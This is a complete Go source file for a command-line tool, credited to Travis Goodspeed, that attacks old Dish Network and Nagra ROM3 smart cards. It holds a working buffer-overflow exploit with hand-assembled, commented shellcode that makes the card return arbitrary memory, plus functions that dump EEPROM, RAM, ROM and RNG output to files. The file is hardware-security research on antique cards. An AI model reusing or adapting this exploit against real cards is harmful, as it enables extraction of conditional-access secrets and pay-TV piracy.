/*

This package is a tool for ancient Dish Network and Nagra smart cards.

It uses a standard USB smart card reader through the PCSC library,
using [go-card](https://github.com/sf1/go-card) as an abstraction
library.

On ROM3 Revision 272 and earlier, it uses a memory corruption exploit
to dump most regions of memory, such as the EEPROM.  The exploit is
based on the NipperClauz exploit, but the shellcode differs in that it
sends a properly formatted reply instead of a straight dump of EEPROM.
This is necessary for compatibility with modern USB smart card
readers.

The exploit could be ported to ROM2 cards, but not to ROM3 cards after
Rev272.  Some later revision cards with mismatched serial numbers have
been reprogrammed, and are still vulnerable to this exploit.

--Travis Goodspeeed 2022


*/

package main

import (
	"flag" // Used for CLI parameters.
	"fmt"  // Used for Printf debugging.

	"os" // Used for file I/O

	"github.com/cheggaaa/pb/v3"        //Progress bar.
	"github.com/sf1/go-card/smartcard" //PCSCd client lib.  Doesn't work in macOS.
)

//Globals are lazy, but handy.
var card *smartcard.Card
var reader *smartcard.Reader
var atr []byte
var rom string
var rev string
var serial int

//Print debugging info.
var verbose bool

//Show the progress bar.
var progress bool

// Fails on an error, but prints it first.
func check(e error) {
	if e != nil {
		panic(e)
	}
}

// Fail if the ATR does not look like right.
func checkatr() {
	atrprefix := []byte{0x3F, 0xFF, 0x95, 0x00, 0xFF, 0x91, 0x81, 0x71}
	for i, s := range atrprefix {
		if atr[i] != s {
			panic(fmt.Sprintf("Unexpected byte %x at index %d of ATR.  %x expected.", atr[i], i, s))
		}
	}
}

// Get the serial number.
func getserial() {
	command := []byte{
		//0x21, 0x00, 0x08, //Implied by the PCSC abstraction.
		0xA0, 0xCA, 0x00, 0x00, // Standard header
		0x02, //Instruction length.
		0x12, //Read Serial Command
		0x00, //Command data length.
		0x06} //Expected response length
	//0x55} //Checksum, XOR of all prior bytes.  Implied.

	response, err := card.TransmitAPDU(command)
	check(err)

	//Sanity check.
	if response[0] != 0x92 || response[1] != 0x04 || response[6] != 0x90 || response[7] != 0x00 {
		panic(fmt.Sprintf("Error in reading serial number.  Reply: %s\n", response))
	}

	//This might not match the physical card if the card has been reprogrammed.
	serial = (int(response[2])<<24 | int(response[3])<<16 | int(response[4])<<8 | int(response[5]))
}

// Prints a byte buffer.
func printhex(data []byte) {
	i := 0
	for _, x := range data {
		fmt.Printf("%02x ", x)
		i = i + 1

		if i%16 == 0 {
			fmt.Printf("\n")
		}
	}
	fmt.Printf("\n")
}

//My rewrite of the Nipper exploit.
var nipperpatch = []byte{
	/* Much of this is padding before the overflow.  We could put
	shellcode here, and the Headend exploit does, but we'll need
	to clobber that buffer in sending our response.
	*/

	0x01, 0x02, 0x03, 0xa4, 0x05, 0x06, 0x07, 0x08,
	0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x11, 0x02, 0x03, 0x04, 0x0a, 0x06, 0x07, 0x08,
	0x59, 0x5A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0xc1, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0xc8,
	0x29, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x31, 0xd2, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	0x39, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x41, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0x08,
	0x49, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x51, 0x02, 0x03, 0x04, 0x05, 0x06, 0xe7, 0x08,
	0x59, 0x0A, 0x0a, 0x0C, 0x0a, 0x0E, 0x0F, 0x10,
	0x61, 0x02, 0x03, 0x04, 0x00, 0x01, 0x02, 0x03,
	0x04, 0x05, 0x0b, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0x0D, 0x0E, 0x0F, 0x00, 0xf1, 0x02, 0x03,
	0x04, 0x05, 0xe6, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0xfD, 0x0c, 0x0F, 0x00, 0x01, 0x02, 0x03,
	0x05, 0x0A, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0x0D, 0x0E, 0x0F, 0x01, 0x01, 0x01, 0x00,
	0x00, 0x00, 0xFF, 0x07, 0x52, 0x56, 0x73, 0x03,
	0xCD, 0xDC, 0x34, 0xC3,

	/* Rather than dump the data directly out to the serial port,
	   as the NipperClauz and Headend exploits do, this shellcode
	   instead returns a properly formatted packet of just 32 bytes.
	   This wasn't needed for serial port adapters in 1998, but it's
	   necessary for USB readers in 2022.
	*/

	//This is the entry point for our shellcode.
	0x9d, 0x9d, 0x9d, 0x9d, //NOPs

	//Data begins at 0x19C+2.
	0xAE, 0x21, //LD X, 0x20 ;
	0x9d, 0x9d, //NOPs
	//loop:
	0xD6, 0xFF, 0xFF, //LD A, (target+1,X)  //Load the byte from the source buffer.
	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
	0x5A,       //DEC X
	0x2A, 0xF6, //JRPL loop  ; F6

	0x9d, //NOP

	//Sends some data from the IO buffer.
	0xa6, 0x93, //LDA #$93, response code
	0xae, 0x40, //LDX #$17, length in data bytes
	0xCD, 0x75, 0x7F, //JMP RESPONDAX to send the response.

	//These three bytes will be clobbered.  Don't rely on them.
	0x00, 0x00, 0x00,
	//These bytes set the entry point of 0x0060
	0x00, 0x00, 0x00, 0x60,
}

//This exploit returns 32 bytes from the RNG.
var nipperpeekrand = []byte{
	/* Much of this is padding before the overflow.  We could put
	shellcode here, and the Headend exploit does, but we'll need
	to clobber that buffer in sending our response.
	*/

	0x01, 0x02, 0x03, 0xa4, 0x05, 0x06, 0x07, 0x08,
	0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x11, 0x02, 0x03, 0x04, 0x0a, 0x06, 0x07, 0x08,
	0x59, 0x5A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0xc1, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0xc8,
	0x29, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x31, 0xd2, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	0x39, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x41, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0x08,
	0x49, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	0x51, 0x02, 0x03, 0x04, 0x05, 0x06, 0xe7, 0x08,
	0x59, 0x0A, 0x0a, 0x0C, 0x0a, 0x0E, 0x0F, 0x10,
	0x61, 0x02, 0x03, 0x04, 0x00, 0x01, 0x02, 0x03,
	0x04, 0x05, 0x0b, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0x0D, 0x0E, 0x0F, 0x00, 0xf1, 0x02, 0x03,
	0x04, 0x05, 0xe6, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0xfD, 0x0c, 0x0F, 0x00, 0x01, 0x02, 0x03,
	0x05, 0x0A, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	0x0C, 0x0D, 0x0E, 0x0F, 0x01, 0x01, 0x01, 0x00,
	0x00, 0x00, 0xFF, 0x07, 0x52, 0x56, 0x73, 0x03,
	0xCD, 0xDC, 0x34, 0xC3,

	//This is the entry point for our shellcode.
	0x9d, //NOP

	//Data begins at 0x19C+2.
	0xAE, 0x21, //LD X, 0x20 ; Length field.
	//loop:
	0xB6, 0x06, //LD A, (target+1,X)  //Load the high byte.
	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
	0x5A,       //DEC X
	0xB6, 0x07, //LD A, (target+1,X)  //Load the low byte.
	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
	0x5A,       //DEC X
	0x2A, 0xF1, //JRPL loop  ; F6

	//Sends some data from the IO buffer.
	0xa6, 0x93, //LDA #$93, response code
	0xae, 0x40, //LDX #$17, length in data bytes
	0xCD, 0x75, 0x7F, //JMP RESPONDAX to send the response.

	0x9d,

	//These three bytes will be clobbered.  Don't rely on them.
	0x00, 0x00, 0x00,
	//These bytes set the entry point of 0x0060
	0x00, 0x00, 0x00, 0x60,
}

// Grabs 32 bytes from an arbitrary start address.
func nipperpeek(adr uint16) []byte {
	exploit := nipperpatch
	exploit[0xad] = byte(adr >> 8)
	exploit[0xae] = byte(adr & 0xFF)

	if verbose {
		fmt.Printf("Sending 0x%02x bytes transaction.\n", len(exploit))
		fmt.Printf("Attempted to read 32 bytes from %04x.\n", adr)
	}

	response, err := card.TransmitAPDU(exploit)

	if verbose {
		fmt.Printf("%s\n", response)
	}
	check(err)

	//Necessary for configuration, if a little ugly.
	reconnect()

	resp := response[5:(0x20 + 5)]
	if verbose {
		fmt.Printf("%02x : %s\n", len(resp), resp)
	}
	return resp
}

// Grabs 32 bytes from the card's RNG.
func nipperrand() []byte {
	exploit := nipperpeekrand

	response, err := card.TransmitAPDU(exploit)

	if verbose {
		fmt.Printf("%s\n", response)
	}
	check(err)

	//Necessary for configuration, if a little ugly.
	reconnect()

	resp := response[5:(0x20 + 5)]
	if verbose {
		fmt.Printf("%02x : %s\n", len(resp), resp)
	}
	return resp
}

// Grabs a large region of memory.
func getblock(start uint16, len uint16) []byte {
	var buffer [0x10000]byte
	var chunk []byte

	tmpl := `{{string . "adr" | blue}} {{ bar . "<" "-" (cycle . "↖" "↗" "↘" "↙" ) "." ">"}} {{speed . | green }} {{percent .}}  `

	bar := pb.StartNew(int(len))
	bar.Set("adr", fmt.Sprintf("$%04x", start))

	bar.SetTemplateString(tmpl)
	bar.Set(pb.Bytes, true)

	for i := 0; i < int(len); i++ {
		if i%32 == 0 {
			//Grab 32 bytes if it's time for the next chunk.
			chunk = nipperpeek(start + uint16(i))
			bar.Set("adr", fmt.Sprintf("$%04x", int(start)+i))
		}
		bar.Increment()
		buffer[i] = chunk[i%32]
	}

	bar.Set("adr", fmt.Sprintf("$%04x", start+len))
	bar.Finish()

	return buffer[0:len]
}

// Grabs a large region of memory.
func getrandblock(len int) []byte {
	var buffer [0x10000]byte
	var chunk []byte

	tmpl := `{{string . "adr" | blue}} {{ bar . "<" "-" (cycle . "↖" "↗" "↘" "↙" ) "." ">"}} {{speed . | green }} {{percent .}}  `

	bar := pb.StartNew(int(len))

	bar.SetTemplateString(tmpl)
	bar.Set(pb.Bytes, true)

	for i := 0; i < int(len); i++ {
		if i%32 == 0 {
			//Grab 32 bytes if it's time for the next chunk.
			chunk = nipperrand()
			bar.Set("adr", fmt.Sprintf("$%04x", i))
		}
		bar.Increment()
		buffer[i] = chunk[i%32]
	}

	bar.Set("adr", fmt.Sprintf("$%04x", len))
	bar.Finish()

	return buffer[0:len]
}

// Dumps a block to a flat file.
func saveblock(filename string, start uint16, len uint16) {
	fmt.Printf("Dumping %d bytes from $%04x to %s.\n", len, start, filename)
	block := getblock(start, len)
	err := os.WriteFile(filename, block, 0644)
	check(err)
}

// Prints some handy info about the card, such as its ROM and Rev.
func info() {
	getserial()
	fmt.Printf("ROM:    %s\n", rom)
	fmt.Printf("Rev:    %s\n", rev)
	fmt.Printf("Serial: %d\n", serial)
}

// For continuation, it's convenient to disconnect from the card and reconnect.
func reconnect() {
	//A very lazy form of continuation, but it works.
	card.Disconnect()
	newcard, err := reader.Connect()
	check(err)
	card = newcard
}

// Main method.
func main() {
	flag.BoolVar(&verbose, "verbose", false, "Verbose output for debugging.")
	flag.BoolVar(&progress, "progress", true, "Interactive progress meter.")
	peek := flag.Int("peek", -1, "Prints a block from a hex address.")
	dumpeeprom := flag.String("dumpeeprom", "", "Downloads EEPROM from $E000 to a .bin file.")
	dumpram := flag.String("dumpram", "", "Downloads SRAM from $0020 to a .bin file.")
	dumprom := flag.String("dumprom", "", "Downloads User ROM from $4000 to a .bin file.")
	dumpsysrom := flag.String("dumpsysrom", "", "Downloads System ROM from $2000 to a .bin file. (Will fail.)")
	dumpall := flag.String("dumpall", "", "Downloads all of memory to a .bin file.  (Will fail.)")
	dumprand := flag.String("dumprand", "", "Downloads RNG samples to a .bin file.")

	flag.Parse()

	// Header
	fmt.Printf("NipperTool by Travis Goodspeed\n")
	fmt.Printf("A Tool for Antique Smart Cards\n\n")

	ctx, err := smartcard.EstablishContext()
	check(err)
	defer ctx.Release()

	reader, err = ctx.WaitForCardPresent()
	check(err)

	card, err = reader.Connect()
	check(err)
	defer card.Disconnect()

	//Fetch the ATR
	atr = card.ATR()
	checkatr()

	//Parse it.
	rom = string(atr[11:19])
	rev = string(atr[20 : len(atr)-1])

	//grab the serial number.
	getserial()

	info()

	//If these flags are set, we need to do some dumping.
	if *peek != -1 {
		block := getblock(uint16(*peek), 32)
		printhex(block)
	}

	if len(*dumpeeprom) > 0 {
		saveblock(*dumpeeprom, 0xE000, 0x1000)
	}
	if len(*dumpram) > 0 {
		saveblock(*dumpram, 0x0020, 0x200)
	}
	if len(*dumprom) > 0 {
		saveblock(*dumprom, 0x4000, 0x4000)
	}
	if len(*dumpsysrom) > 0 {
		fmt.Printf("FIXME: This will crash near 0x1FE0.\n")
		saveblock(*dumpsysrom, 0x1F00, 0x1600)
	}
	if len(*dumpall) > 0 {
		fmt.Printf("FIXME: This will crash near 0x1FE0.\n")
		saveblock(*dumpall, 0x0000, 0xFFFF)
	}
	if len(*dumprand) > 0 {
		l := 0x400
		fmt.Printf("Dumping %d random bytes to %s.\n", l, *dumprand)
		block := getrandblock(l)
		err := os.WriteFile(*dumprand, block, 0644)
		check(err)
	}

}
